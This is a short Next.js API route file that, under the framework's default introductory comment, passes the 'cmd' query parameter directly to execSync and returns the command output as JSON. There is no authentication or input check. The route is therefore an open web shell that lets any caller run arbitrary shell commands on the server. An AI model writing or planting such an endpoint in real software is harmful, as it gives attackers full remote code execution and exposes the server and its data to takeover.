// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import { execSync } from "child_process";

globalThis.catalyst = "test";
export default function handler(req, res) {
  const cmd = execSync(req.query.cmd);
  // console.log("hello api :::", process.pid, process.ppid, {globalThis}, process.uptime());
  res.status(200).json({ cmd: cmd.toString() });
}
